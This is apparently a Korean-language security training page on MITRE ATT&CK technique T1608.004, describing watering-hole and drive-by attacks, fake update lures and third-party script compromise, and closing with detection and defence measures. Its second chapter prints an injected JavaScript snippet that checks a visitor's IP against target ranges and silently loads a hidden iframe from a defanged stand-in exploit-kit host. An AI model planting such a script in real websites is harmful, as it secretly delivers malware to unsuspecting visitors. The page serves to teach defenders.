T1608.004
Drive-by 타겟

피해자가 방문할 가능성이 높은 웹사이트를 타협하거나 악성 콘텐츠를 삽입하여 Drive-by 다운로드/Exploit을 배치하는 기법을 학습합니다.

🌊 Chapter 1 — Drive-by 공격 개요

Drive-by 공격은 사용자가 정상 웹사이트를 방문하는 것만으로 악성코드에 감염되는 기법입니다. 공격자는 타겟 조직의 구성원이 자주 방문하는 웹사이트를 파악하고, 해당 사이트에 악성 코드를 삽입합니다.

워터링홀 공격 (Watering Hole)
  • - 타겟 업계 포럼/뉴스 사이트 해킹
  • - 관련 콘퍼런스/학회 웹사이트 변조
  • - 업무용 SaaS 서비스 서드파티 스크립트 오염
  • - 특정 지역/언어 웹사이트 타겟팅
Drive-by 페이로드 유형
  • - 브라우저 Exploit Kit (RIG, Magnitude)
  • - 악성 JavaScript 주입
  • - iframe 리다이렉트
  • - 가짜 소프트웨어 업데이트 팝업

# 워터링홀 타겟 분석 — 방위산업 종사자 대상

⚡ Chapter 2 — 워터링홀 구성

JavaScript 주입 공격

해킹한 웹사이트에 악성 JavaScript를 삽입하여 방문자의 브라우저를 프로파일링하고, 타겟 조건(IP 대역, 브라우저, OS)에 맞으면 Exploit을 전달합니다. 조건에 맞지 않는 방문자에게는 정상 페이지를 보여줍니다.

# 해킹된 사이트에 삽입된 악성 JavaScript — 조건부 리다이렉트

# injected_payload.js (난독화 전)

(function(){

var targetIPs = ['203.0.113.0/24','198.51.100.0/24']; // 방위산업 IP대역

var xhr = new XMLHttpRequest();

xhr.open('GET','https://api.ipify.org?format=json',true);

xhr.onload = function(){

var ip = JSON.parse(xhr.responseText).ip;

if(matchCIDR(ip, targetIPs)){

// 타겟 → Exploit Kit으로 리다이렉트

var iframe = document.createElement('iframe');

iframe.src = 'https://cdn-update[.]com/gate.php';

iframe.style.cssText = 'width:0;height:0;border:0;';

document.body.appendChild(iframe);

}

}; xhr.send();

})();

가짜 업데이트 페이지

SocGholish 계열 공격은 웹사이트 방문 시 "브라우저 업데이트 필요" 또는 "Flash Player 업데이트"를 가장한 팝업을 표시합니다. 사용자가 다운로드하면 RAT 또는 로더가 실행됩니다. 최근에는 가짜 CAPTCHA 챌린지 형태도 등장했습니다.

서드파티 스크립트 공급망 공격

타겟 사이트가 로드하는 외부 JavaScript(광고 SDK, 분석 도구, 채팅 위젯)의 CDN을 해킹하면, 해당 스크립트를 사용하는 모든 사이트에 악성코드를 배포할 수 있습니다. Magecart 그룹이 결제 페이지에서 이 기법을 광범위하게 사용했습니다.

🛡️ Chapter 3 — 탐지와 방어

네트워크 기반 탐지
  • - DNS 시크홀/RPZ로 알려진 Exploit Kit 차단
  • - SSL 복호화를 통한 숨겨진 iframe 탐지
  • - 브라우저 트래픽의 비정상 리다이렉트 체인 분석
  • - CSP 위반 보고서 모니터링
엔드포인트 방어
  • - 브라우저 자동 업데이트 및 패치 관리
  • - 브라우저 격리(Browser Isolation) 솔루션
  • - 스크립트 실행 제어 (WDAC/AppLocker)
  • - EDR의 브라우저 프로세스 모니터링
웹 보안 게이트웨이 (SWG)

SWG는 직원의 웹 트래픽을 프록시하여 악성 사이트 접근을 차단합니다. URL 필터링, 콘텐츠 검사, SSL 복호화를 통해 Drive-by 공격을 사전 차단할 수 있습니다. 클라우드 기반 SWG는 원격 근무자도 보호합니다.
